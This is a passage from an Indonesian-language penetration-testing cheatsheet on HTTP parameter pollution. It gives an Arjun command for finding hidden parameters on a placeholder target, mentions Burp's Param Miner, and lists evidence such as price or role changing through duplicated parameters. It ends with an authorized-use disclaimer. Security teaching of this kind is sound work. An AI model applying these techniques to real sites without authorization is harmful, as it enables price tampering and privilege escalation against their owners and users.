python3 arjun -u https://target.com/endpoint -m POST

# Param Miner (Burp extension)
# Automatically finds hidden parameters
```

## Bukti
- Server memproses parameter kedua bukan pertama
- Harga/role/permission berubah via parameter pollution
- Screenshot perbedaan behavior dengan parameter tunggal vs duplikat

---

> ⚠️ **DISCLAIMER**: Semua teknik di cheatsheet ini hanya untuk **ethical hacking** dan **penetration testing yang sudah diotorisasi**. Penggunaan tanpa izin merupakan pelanggaran hukum.
